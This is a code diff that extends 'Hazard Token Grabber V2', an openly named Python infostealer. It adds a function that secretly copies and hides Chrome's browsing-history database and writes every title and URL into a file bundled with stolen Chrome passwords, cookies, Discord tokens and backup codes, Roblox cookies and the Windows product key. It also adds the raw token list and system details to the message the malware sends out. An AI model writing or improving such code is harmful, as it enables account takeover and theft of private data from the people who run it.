@@ -1,11 +1,14 @@
 import os
 import json
 import shutil
-import base64 
+import base64
+import sys
 import psutil
 import sqlite3
 import zipfile
 import requests
+import win32api
+import win32con
 import subprocess
 
 from threading import Thread
@@ -69,20 +72,22 @@ class Hazard_Token_Grabber_V2(functions):
         self.tokens = []
         self.robloxcookies = []
         self.files = ""
+        self.errors = ""
         
         self.bypassBetterDiscord()
         self.bypassTokenProtector()
         if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data') or not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
-            self.files += f"{os.getlogin()} doesn't have google installed\n"
+            self.errors += f"{os.getlogin()} doesn't have google installed\n"
         else:
             self.grabPassword()
             self.grabCookies()
+            self.historyLog()
         Thread(target=self.screenshot).start()
         Thread(target=self.killDiscord).start()
         self.grabTokens()
         self.neatifyTokens()
         self.grabRobloxCookie()
-        for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
+        for i in ["Google Passwords.txt", "Google Cookies.txt", "Google History.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
                 with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
                     x = ff.read()
@@ -172,7 +177,31 @@ class Hazard_Token_Grabber_V2(functions):
                 content = txt.replace(x, 'RdimoTheGoat')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
+                
+                
+               
 
+    # Made by localsmail on github.
+    def historyLog(self):
+        history_path = os.path.expanduser(
+            '~') + r"\AppData\Local\Google\Chrome\User Data\Default"
+        login_db = os.path.join(history_path, 'History')
+        shutil.copyfile(login_db, "histdb.db")
+        win32api.SetFileAttributes("histdb.db", win32con.FILE_ATTRIBUTE_HIDDEN)
+        c = sqlite3.connect("histdb.db")
+        cursor = c.cursor()
+        select_statement = "SELECT title, url FROM urls"
+        cursor.execute(select_statement)
+        history = cursor.fetchall()
+        with open(self.tempfolder + "\\Google History.txt", "w", encoding="cp437", errors='ignore') as f:
+            for title, url in history:
+                f.write(
+                    "GOOGLE HISTORY LOGGER MADE BY LOCALSMAIL ON GITHUB\n\n" + f"Title: {str(title.encode('unicode-escape').decode('utf-8')).strip()}\nURL: {str(url.encode('unicode-escape').decode('utf-8')).strip()}" + "\n\n<" + "=" * 50 + ">\n\n") # Sum stuff to make it look nicer to look at
+            f.close()
+        c.close()
+        win32api.SetFileAttributes("histdb.db", win32con.FILE_ATTRIBUTE_NORMAL)
+        os.remove("histdb.db") 
+    
     def getProductValues(self):
         try:
             wkey = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
@@ -374,6 +403,8 @@ class Hazard_Token_Grabber_V2(functions):
         files = os.listdir(self.tempfolder)
         for f in files:
             self.files += f"\n{f}"
+        if self.errors == "":
+            self.errors += "None"
         self.fileCount = f"{len(files)} Files Found: "
         embed = {
             "avatar_url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
@@ -384,15 +415,15 @@ class Hazard_Token_Grabber_V2(functions):
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif"
                     },
-                    "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+                    "description": f'**{os.getlogin()}** ran the logger\n```fix\nComputer info\nComputer Name: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\n Cpu Count: {os.cpu_count()}\n``` ============ ```fix\nGeneral info\n\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\n\n{self.fileCount}{self.files}```\n[Google Maps Location]({googlemap}) \nErrors\n{self.errors}',
                     "color": 16119101,
 
                     "thumbnail": {
                       "url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"
-                    },       
+                    },
 
                     "footer": {
-                      "text": "Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                      "text": f"Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\nTokens:\n{self.tokens}"
                     }
                 }
             ]
